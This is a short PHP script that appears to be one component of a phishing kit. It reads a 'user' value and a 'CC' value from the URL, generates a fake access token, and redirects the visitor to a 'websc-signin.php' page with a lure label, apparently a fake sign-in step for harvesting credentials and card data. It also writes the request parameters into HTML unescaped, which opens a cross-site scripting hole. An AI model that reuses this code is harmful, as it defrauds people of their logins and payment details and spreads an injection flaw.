<?php
$x=md5(microtime());
$e = $_GET['user'];
$c = $_GET['CC'];
echo "<META HTTP-EQUIV='refresh' content='0; URL=websc-signin.php?Go=_Litigations_Manager&user=$e&_Acess_Tooken=$x$x&CC=$c'>";exit;
?>